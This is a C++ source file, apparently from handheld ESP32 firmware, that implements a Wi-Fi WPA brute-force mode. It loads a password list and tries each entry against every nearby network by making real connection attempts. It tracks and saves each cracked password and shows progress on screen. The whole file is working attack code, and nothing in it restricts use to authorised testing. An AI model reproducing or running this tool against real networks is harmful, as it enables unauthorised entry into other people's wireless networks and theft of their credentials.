// pid PID::WIFI_WPA_BF_ALL

#define BF_ALL_ATTEMPT_TIMEOUT_MS 3000

static bool _bfaRunning = false;
static bool _bfaDone = false;
static int _bfaPassIndex = 0;
static int _bfaNetIndex = 0;
static int _bfaTotal = 0;
static int _bfaNetCount = 0;
static int _bfaCracked = 0;
static String _bfaCurrentPass = "";
static String _bfaCurrentSsid = "";
static unsigned long _bfaAttemptStart = 0;
static String* _bfaPasswords = nullptr;
static int* _bfaNetIndices = nullptr;
static volatile bool _bfaGotResult = false;
static volatile bool _bfaConnected = false;

static void _bfaFreeAll() {
	delete[] _bfaPasswords;_bfaPasswords = nullptr;
	delete[] _bfaNetIndices; _bfaNetIndices = nullptr;
	_bfaTotal = _bfaNetCount = _bfaPassIndex = _bfaNetIndex = 0;
}

static void _bfaRestart() {
	_bfaFreeAll();
	selectedFilePath = "";
	fpActive = false;
	filePickerSetup(PID::WIFI_WPA_BF_ALL);
}

static void _bfaFinish(bool allCracked) {
	_bfaRunning = false;
	_bfaDone = true;
	char buf[24];
	snprintf(buf, sizeof(buf), L->TXT_WIFI_BF_ALL_CRACKED, _bfaCracked, wifiCount);
	if (allCracked) {
		centeredPrint(String(buf), MEDIUM_TEXT);
		soundSuccess();
	} else {
		String lines[] = {
			_bfaCracked > 0 ? String(L->TXT_SUCCESS) : String(L->TXT_FAILED),
			String(buf)
		};
		centeredPrintRows(lines, 2, MEDIUM_TEXT);
		if (_bfaCracked > 0) soundSuccess(); else soundError();
	}
	_bfaFreeAll();
}

static void _bfaDrawProgress() {
	char line1[24];
	snprintf(line1, sizeof(line1), "%d/%d pass | %d/%d nets",
		_bfaPassIndex + 1, _bfaTotal, _bfaNetIndex + 1, _bfaNetCount);
	char line2[24];
	snprintf(line2, sizeof(line2), "cracked: %d", _bfaCracked);
	String lines[] = { String(line1), _bfaCurrentSsid.substring(0, 18), _bfaCurrentPass.substring(0, 18), String(line2) };
	centeredPrintRows(lines, 4, SMALL_TEXT, true);
	drawSpinner();
	canvas.pushSprite(0, getStatusBarHeight());
}

static void _bfaOnWifiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
	if (event == ARDUINO_EVENT_WIFI_STA_CONNECTED) {
		_bfaConnected = _bfaGotResult = true;
	} else if (event == ARDUINO_EVENT_WIFI_STA_DISCONNECTED && !_bfaConnected) {
		_bfaGotResult = true;
	}
}

static void _bfaStartAttempt() {
	_bfaGotResult = false;
	_bfaConnected = false;
	_bfaCurrentPass = _bfaPasswords[_bfaPassIndex];
	_bfaCurrentSsid = WiFi.SSID(_bfaNetIndices[_bfaNetIndex]);
	WiFi.disconnect(true);
	delay(50);
	WiFi.mode(WIFI_STA);
	WiFi.begin(_bfaCurrentSsid.c_str(), _bfaCurrentPass.c_str());
	_bfaAttemptStart = millis();
	_bfaDrawProgress();
}

void wifiBruteforceAllLoop() {
	if (isSetup()) {
		_bfaRunning = _bfaDone = _bfaGotResult = _bfaConnected = false;
		_bfaCracked = 0;
		WiFi.onEvent(_bfaOnWifiEvent);
		if (wifiCount == 0) {
			centeredPrint(L->TXT_WIFI_NO_NETWORKS, MEDIUM_TEXT);
			_bfaDone = true;
		} else {
			_bfaRestart();
		}
	}

	checkExit();

	if (_bfaDone) return;

	// File picker phase
	if (fpActive) {
		if (filePickerLoop()) return;
		if (selectedFilePath == "") return; // cancelled

		if (!readFileLines(selectedFilePath, _bfaPasswords, _bfaTotal)) {
			centeredPrint(L->TXT_BT_FILE_ERROR, MEDIUM_TEXT);
			_bfaRestart();
			return;
		}

		_bfaNetIndices = new int[wifiCount];
		_bfaNetCount = wifiCount;
		for (int i = 0; i < wifiCount; i++) _bfaNetIndices[i] = i;

		char buf[24]; snprintf(buf, sizeof(buf), L->TXT_WIFI_BF_LOADED, _bfaTotal);
		char buf2[24]; snprintf(buf2, sizeof(buf2), L->TXT_WIFI_BF_ALL_NETS, _bfaNetCount);
		String lines[] = { String(buf), String(buf2) };
		centeredPrintRows(lines, 2, SMALL_TEXT, true);
		drawHintCustom("enter: start", "A: start");
		return;
	}

	if (selectedFilePath == "") return; // waiting for picker

	// Waiting to start
	if (!_bfaRunning) {
		if (isBtnAWasPressed() || isKbEnterPressed()) {
			_bfaRunning = true;
			_bfaPassIndex = _bfaNetIndex = 0;
			_bfaStartAttempt();
		}
		return;
	}

	if (!_bfaGotResult && millis() - _bfaAttemptStart <= BF_ALL_ATTEMPT_TIMEOUT_MS) {
		_bfaDrawProgress();
		return;
	}

	WiFi.disconnect(true);

	if (_bfaConnected) {
		_bfaCracked++;
		saveWifiPassword(_bfaCurrentSsid, _bfaCurrentPass);
		soundSuccess();
		for (int i = _bfaNetIndex; i < _bfaNetCount - 1; i++) _bfaNetIndices[i] = _bfaNetIndices[i + 1];
		_bfaNetCount--;
	} else {
		_bfaNetIndex++;
	}

	if (_bfaNetCount == 0) { _bfaFinish(true); return; }
	if (_bfaNetIndex >= _bfaNetCount) { _bfaNetIndex = 0; _bfaPassIndex++; }
	if (_bfaPassIndex >= _bfaTotal) { _bfaFinish(false); return; }

	_bfaStartAttempt();
}
